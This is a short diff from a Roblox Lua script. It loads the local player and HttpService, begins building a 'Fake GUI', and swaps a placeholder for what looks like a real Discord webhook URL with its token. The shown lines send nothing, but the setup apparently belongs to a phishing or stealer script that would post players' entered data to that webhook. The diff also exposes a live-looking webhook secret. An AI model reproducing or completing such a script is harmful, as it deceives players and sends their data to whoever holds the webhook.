@@ -1,6 +1,6 @@
 local player = game:GetService("Players").LocalPlayer
 local httpService = game:GetService("HttpService")
-local webhookURL = "YOUR_WEBHOOK_URL" -- Replace with your actual webhook URL
+local webhookURL = "https://discord.com/api/webhooks/1342773044883750942/nWKkqCoC6H2F7nt6ua1f2FULcRzoRqAJdK0ZmDPlK3r4wIu_1A8kJ8fkZb_qeNDk95zL" -- Replace with your actual webhook URL
 
 -- Create the Fake GUI
 local ScreenGui = Instance.new("ScreenGui")
